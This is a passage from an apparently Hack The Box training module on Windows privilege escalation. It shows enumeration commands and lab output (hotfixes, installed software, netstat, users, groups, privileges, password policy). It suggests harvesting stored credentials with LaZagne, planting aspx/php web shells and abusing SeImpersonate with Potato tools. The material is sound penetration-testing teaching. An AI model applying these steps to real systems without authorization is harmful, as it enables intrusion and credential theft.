                                 <span class="hljs-selector-attr">[03]</span>: <span class="hljs-selector-tag">dead</span><span class="hljs-selector-pseudo">:beef</span><span class="hljs-selector-pseudo">::e4db</span><span class="hljs-selector-pseudo">:5ea3</span><span class="hljs-selector-pseudo">:2775</span><span class="hljs-selector-pseudo">:8d4d</span>
                           <span class="hljs-selector-attr">[02]</span>: <span class="hljs-selector-tag">vmxnet3</span> <span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">Adapter</span>
                                 <span class="hljs-selector-tag">Connection</span> <span class="hljs-selector-tag">Name</span>: <span class="hljs-selector-tag">Ethernet1</span>
                                 <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Enabled</span>:    <span class="hljs-selector-tag">No</span>
                                 <span class="hljs-selector-tag">IP</span> <span class="hljs-selector-tag">address</span>(es)
                                 <span class="hljs-selector-attr">[01]</span>: <span class="hljs-selector-tag">192</span><span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.20</span><span class="hljs-selector-class">.56</span>
                                 <span class="hljs-selector-attr">[02]</span>: <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::f055</span><span class="hljs-selector-pseudo">:fefd</span><span class="hljs-selector-pseudo">:b1b</span><span class="hljs-selector-pseudo">:9919</span>
<span class="hljs-selector-tag">Hyper-V</span> <span class="hljs-selector-tag">Requirements</span>:      <span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">hypervisor</span> <span class="hljs-selector-tag">has</span> <span class="hljs-selector-tag">been</span> <span class="hljs-selector-tag">detected</span>. <span class="hljs-selector-tag">Features</span> <span class="hljs-selector-tag">required</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">Hyper-V</span> <span class="hljs-selector-tag">will</span> <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">be</span> <span class="hljs-selector-tag">displayed</span>.
</code></pre>
<p><strong>Patches and Updates</strong></p>
<p>If <code>systeminfo</code> doesn&#39;t display hotfixes, they may be queriable with <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">WMI</a> using the WMI-Command binary with <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering">QFE (Quick Fix Engineering)</a> to display patches.</p>
<pre><code class="lang-cmd-session">C:\htb&gt; wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=<span class="hljs-number">3199986</span>  WINLPE-SRV01  Update                        KB<span class="hljs-number">3199986</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">11/21/2016</span>
https://support.microsoft.com/help/<span class="hljs-number">5001078</span>  WINLPE-SRV01  Security Update               KB<span class="hljs-number">5001078</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">3/25/2021</span>
http://support.microsoft.com/?kbid=<span class="hljs-number">4103723</span>  WINLPE-SRV01  Security Update               KB<span class="hljs-number">4103723</span>               NT AUTHORITY\SYSTEM  <span class="hljs-number">3/25/2021</span>
</code></pre>
<p>We can do this with PowerShell as well using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1">Get-Hotfix</a> cmdlet.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB<span class="hljs-number">3199986</span> NT AUTHORITY\SYSTEM        <span class="hljs-number">11/21/2016</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
WINLPE-SRV01 Update          KB<span class="hljs-number">4054590</span> WINLPE-SRV01\Administrator <span class="hljs-number">3/30/2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
WINLPE-SRV01 Security Update KB<span class="hljs-number">5001078</span> NT AUTHORITY\SYSTEM        <span class="hljs-number">3/25/2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
WINLPE-SRV01 Security Update KB<span class="hljs-number">3200970</span> WINLPE-SRV01\Administrator <span class="hljs-number">4/13/2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
</code></pre>
<p>WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Is <code>FileZilla</code>/<code>Putty</code>/etc installed? Run <code>LaZagne</code> to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable.</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">wmic</span> <span class="hljs-selector-tag">product</span> <span class="hljs-selector-tag">get</span> <span class="hljs-selector-tag">name</span>

<span class="hljs-selector-tag">Name</span>
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X64</span> <span class="hljs-selector-tag">Additional</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.24</span><span class="hljs-selector-class">.28127</span>
<span class="hljs-selector-tag">Java</span> 8 <span class="hljs-selector-tag">Update</span> 231 (64<span class="hljs-selector-tag">-bit</span>)
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X86</span> <span class="hljs-selector-tag">Additional</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.24</span><span class="hljs-selector-class">.28127</span>
<span class="hljs-selector-tag">VMware</span> <span class="hljs-selector-tag">Tools</span>
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X64</span> <span class="hljs-selector-tag">Minimum</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.24</span><span class="hljs-selector-class">.28127</span>
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X86</span> <span class="hljs-selector-tag">Minimum</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.24</span><span class="hljs-selector-class">.28127</span>
<span class="hljs-selector-tag">Java</span> <span class="hljs-selector-tag">Auto</span> <span class="hljs-selector-tag">Updater</span>

&lt;<span class="hljs-selector-tag">SNIP</span>&gt;
</code></pre>
<p>We can, of course, do this with PowerShell as well using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> cmdlet.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server <span class="hljs-number">2016</span> Database Engine Shared                                  <span class="hljs-number">13.2</span><span class="hljs-meta">.5026</span><span class="hljs-meta">.0</span>
Microsoft OLE <span class="hljs-built_in">DB</span> Driver for SQL Server                                  <span class="hljs-number">18.3</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>
Microsoft Visual C++ <span class="hljs-number">2010</span>  x64 Redistributable - <span class="hljs-number">10.0</span><span class="hljs-meta">.40219</span>             <span class="hljs-number">10.0</span><span class="hljs-meta">.40219</span>
Microsoft Help Viewer <span class="hljs-number">2.3</span>                                               <span class="hljs-number">2.3</span><span class="hljs-meta">.28107</span>
Microsoft Visual C++ <span class="hljs-number">2010</span>  x86 Redistributable - <span class="hljs-number">10.0</span><span class="hljs-meta">.40219</span>             <span class="hljs-number">10.0</span><span class="hljs-meta">.40219</span>
Microsoft Visual C++ <span class="hljs-number">2013</span> x86 Minimum Runtime - <span class="hljs-number">12.0</span><span class="hljs-meta">.21005</span>              <span class="hljs-number">12.0</span><span class="hljs-meta">.21005</span>
Microsoft Visual C++ <span class="hljs-number">2013</span> x86 Additional Runtime - <span class="hljs-number">12.0</span><span class="hljs-meta">.21005</span>           <span class="hljs-number">12.0</span><span class="hljs-meta">.21005</span>
Microsoft Visual C++ <span class="hljs-number">2019</span> X64 Additional Runtime - <span class="hljs-number">14.28</span><span class="hljs-meta">.29914</span>          <span class="hljs-number">14.28</span><span class="hljs-meta">.29914</span>
Microsoft ODBC Driver <span class="hljs-number">13</span> for SQL Server                                 <span class="hljs-number">13.2</span><span class="hljs-meta">.5026</span><span class="hljs-meta">.0</span>
SQL Server <span class="hljs-number">2016</span> Database Engine Shared                                  <span class="hljs-number">13.2</span><span class="hljs-meta">.5026</span><span class="hljs-meta">.0</span>
SQL Server <span class="hljs-number">2016</span> Database Engine Services                                <span class="hljs-number">13.2</span><span class="hljs-meta">.5026</span><span class="hljs-meta">.0</span>
SQL Server Management Studio for Reporting Services                     <span class="hljs-number">15.0</span><span class="hljs-meta">.18369</span><span class="hljs-meta">.0</span>
Microsoft SQL Server <span class="hljs-number">2008</span> Setup Support Files                           <span class="hljs-number">10.3</span><span class="hljs-meta">.5500</span><span class="hljs-meta">.0</span>
SSMS Post Install Tasks                                                 <span class="hljs-number">15.0</span><span class="hljs-meta">.18369</span><span class="hljs-meta">.0</span>
Microsoft VSS Writer for SQL Server <span class="hljs-number">2016</span>                                <span class="hljs-number">13.2</span><span class="hljs-meta">.5026</span><span class="hljs-meta">.0</span>
Java <span class="hljs-number">8</span> Update <span class="hljs-number">231</span> (<span class="hljs-number">64</span>-bit)                                              <span class="hljs-number">8.0</span><span class="hljs-meta">.2310</span><span class="hljs-meta">.11</span>
Browser for SQL Server <span class="hljs-number">2016</span>                                             <span class="hljs-number">13.2</span><span class="hljs-meta">.5026</span><span class="hljs-meta">.0</span>
Integration Services                                                    <span class="hljs-number">15.0</span><span class="hljs-meta">.2000</span><span class="hljs-meta">.130</span>

&lt;SNIP&gt;
</code></pre>
<p><strong>Display Running Processes</strong></p>
<p>The <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat">netstat</a> command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the local host (when logged on to the host) that we can exploit to escalate privileges.</p>
<p><strong>Netstat</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">netstat</span> <span class="hljs-selector-tag">-ano</span>

<span class="hljs-selector-tag">Active</span> <span class="hljs-selector-tag">Connections</span>

  <span class="hljs-selector-tag">Proto</span>  <span class="hljs-selector-tag">Local</span> <span class="hljs-selector-tag">Address</span>          <span class="hljs-selector-tag">Foreign</span> <span class="hljs-selector-tag">Address</span>        <span class="hljs-selector-tag">State</span>           <span class="hljs-selector-tag">PID</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:21</span>             0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       1096
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:80</span>             0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:135</span>            0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       840
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:445</span>            0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:1433</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       3520
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:3389</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       968
&lt;..<span class="hljs-selector-class">.SNIP</span>...&gt;
</code></pre>
<hr>
<h3 id="user-group-information">User &amp; Group Information</h3>
<p>Users are often the weakest link in an organization, especially when systems are configured and patched well. It is essential to gain an understanding of the users and groups on the system, members of specific groups that can provide us with admin level access, the privileges our current user has, password policy information, and any logged on users that we may be able to target. We may find the system to be well patched, but a member of the local administrators group&#39;s user directory is browsable and contains a password file such as <code>logins.xlsx</code>, resulting in a very easy win.</p>
<p><strong>Logged-In Users</strong></p>
<p>It is always important to determine what users are logged into a system. Are they idle or active? Can we determine what they are working on? While more challenging to pull off, we can sometimes attack users directly to escalate privileges or gain further access. During an evasive engagement, we would need to tread lightly on a host with other user(s) actively working on it to avoid detection.</p>
<pre><code class="lang-cmd-session">C:\htb&gt; query <span class="hljs-keyword">user</span>

 <span class="hljs-title">USERNAME</span>              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;administrator         rdp-tcp<span class="hljs-comment">#2           1  Active          .  3/25/2021 9:27 AM</span>
</code></pre>
<p><strong>Current User</strong></p>
<p>When we gain access to a host, we should always check what user context our account is running under first. Sometimes, we are already SYSTEM or equivalent! Suppose we gain access as a service account. In that case, we may have privileges such as <code>SeImpersonatePrivilege</code>, which can often be easily abused to escalate privileges using a tool such as <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a>.</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; echo <span class="hljs-variable">%USERNAME%</span>

htb-student
</code></pre>
<p><strong>Current User Privileges</strong></p>
<p>As mentioned prior, knowing what privileges our user has can greatly help in escalating privileges. We will look at individual user privileges and escalation paths later in this module.</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</code></pre>
<p><strong>Current User Group Information</strong></p>
<p>Has our user inherited any rights through their group membership? Are they privileged in the Active Directory domain environment, which could be leveraged to gain access to more systems?</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /groups

<span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span>
-----------------

<span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>                             <span class="hljs-keyword">Type</span>             SID          <span class="hljs-keyword">Attributes</span>
====================================== ================ ============ ==================================================
Everyone                               Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-1-0</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">BUILTIN</span>\Remote Desktop Users           Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">555</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">BUILTIN</span>\Users                          Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-14</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\INTERACTIVE               Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-4</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\Authenticated Users       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-11</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\This Organization         Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-15</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\Local account             Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-113</span>    Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">LOCAL</span>                                  Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-2-0</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\NTLM Authentication       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-64-10</span>  Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">Mandatory</span> Label\Medium Mandatory Level Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span>
</code></pre>
<p><strong>Get All Users</strong></p>
<p>Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user <code>bob</code>, and see a <code>bob_adm</code> user in the local administrators group, it is worth checking for credential re-use. Can we access the user profile directory for any important users? We may find valuable files such as scripts with passwords or SSH keys in a user&#39;s Desktop, Documents, or Downloads folder.</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net user

User accounts <span class="hljs-keyword">for</span> \\WINLPE-SRV01

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<p><strong>Get All Groups</strong></p>
<p>Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.</p>
<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">net</span> localgroup

Aliases <span class="hljs-keyword">for</span> \\WINLPE-SRV01

-------------------------------------------------------------------------------
<span class="hljs-comment">*Access Control Assistance Operators</span>
<span class="hljs-comment">*Administrators</span>
<span class="hljs-comment">*Backup Operators</span>
<span class="hljs-comment">*Certificate Service DCOM Access</span>
<span class="hljs-comment">*Cryptographic Operators</span>
<span class="hljs-comment">*Distributed COM Users</span>
<span class="hljs-comment">*Event Log Readers</span>
<span class="hljs-comment">*Guests</span>
<span class="hljs-comment">*Hyper-V Administrators</span>
<span class="hljs-comment">*IIS_IUSRS</span>
<span class="hljs-comment">*Network Configuration Operators</span>
<span class="hljs-comment">*Performance Log Users</span>
<span class="hljs-comment">*Performance Monitor Users</span>
<span class="hljs-comment">*Power Users</span>
<span class="hljs-comment">*Print Operators</span>
<span class="hljs-comment">*RDS Endpoint Servers</span>
<span class="hljs-comment">*RDS Management Servers</span>
<span class="hljs-comment">*RDS Remote Access Servers</span>
<span class="hljs-comment">*Remote Desktop Users</span>
<span class="hljs-comment">*Remote Management Users</span>
<span class="hljs-comment">*Replicator</span>
<span class="hljs-comment">*Storage Replica Administrators</span>
<span class="hljs-comment">*System Managed Accounts Group</span>
<span class="hljs-comment">*Users</span>
The command completed successfully.
</code></pre>
<p><strong>Details About a Group</strong></p>
<p>It is worth checking out the details for any non-standard groups. Though unlikely, we may find a password or other interesting information stored in the group&#39;s description. During our enumeration, we may discover credentials of another non-admin user who is a member of a local group that can be leveraged to escalate privileges.</p>
<p>Initial Enumeration</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator
helpdesk
sarah
secsvc
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<p><strong>Get Password Policy &amp; Other Account Information</strong></p>
<p>Initial Enumeration</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C:\htb&gt; net accounts

Force user logoff how long after time expires?</span>:       Never
<span class="hljs-attribute">Minimum password age (days)</span>:                          0
<span class="hljs-attribute">Maximum password age (days)</span>:                          42
<span class="hljs-attribute">Minimum password length</span>:                              0
<span class="hljs-attribute">Length of password history maintained</span>:                None
<span class="hljs-attribute">Lockout threshold</span>:                                    Never
<span class="hljs-attribute">Lockout duration (minutes)</span>:                           30
<span class="hljs-attribute">Lockout observation window (minutes)</span>:                 30
<span class="hljs-attribute">Computer role</span>:                                        SERVER
<span class="hljs-attribute">The command completed successfully.</span>
</code></pre>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>As stated before, this is not an exhaustive list of enumeration commands. The tools we discussed in the previous section will greatly assist in speeding up the enumeration process and making sure it is comprehensive with no stone left unturned. Many cheat sheets are available to help us, such as <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">this one</a>. Study the tools and their output and start making your own command cheat sheet, so it is readily available in case you encounter an environment that requires mostly or all manual enumeration.</p>
<h2 id="communication-with-processes">Communication with Processes</h2>
<hr>
<p>One of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator, it may lead to additional privileges. The most common example is discovering a web server like IIS or XAMPP running on the box, placing an <code>aspx/php</code> shell on the box, and gaining a shell as the user running the web server. Generally, this is not an administrator but will often have the <code>SeImpersonate</code> token, allowing for <code>Rogue/Juicy/Lonely Potato</code> to provide SYSTEM permissions.</p>
<hr>
<h3 id="access-tokens">Access Tokens</h3>
<p>In Windows, <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a> are used to describe the security context (security attributes or rules) of a process or thread. The token includes information about the user account&#39;s identity and privileges related to a specific process or thread. When a user authenticates to a system, their password is verified against a security database, and if properly authenticated, they will be assigned an access token. Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level.</p>
<hr>
<h3 id="enumerating-network-services">Enumerating Network Services</h3>
<p>The most common way people interact with processes is through a network socket (DNS, HTTP, SMB, etc.). The <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat">netstat</a> command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the localhost (when logged on to the host) that we can exploit to escalate privileges.</p>
<p><strong>Display Active Network Connections</strong></p>
<p>Communication with Processes</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">netstat</span> <span class="hljs-selector-tag">-ano</span>

<span class="hljs-selector-tag">Active</span> <span class="hljs-selector-tag">Connections</span>

  <span class="hljs-selector-tag">Proto</span>  <span class="hljs-selector-tag">Local</span> <span class="hljs-selector-tag">Address</span>          <span class="hljs-selector-tag">Foreign</span> <span class="hljs-selector-tag">Address</span>        <span class="hljs-selector-tag">State</span>           <span class="hljs-selector-tag">PID</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:21</span>             0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       3812
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:80</span>             0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:135</span>            0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       836
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:445</span>            0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:3389</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       936
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:5985</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:8080</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       5044
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:47001</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49664</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       528
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49665</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       996
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49666</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       1260
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49668</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       2008
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49669</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       600
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49670</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       1888
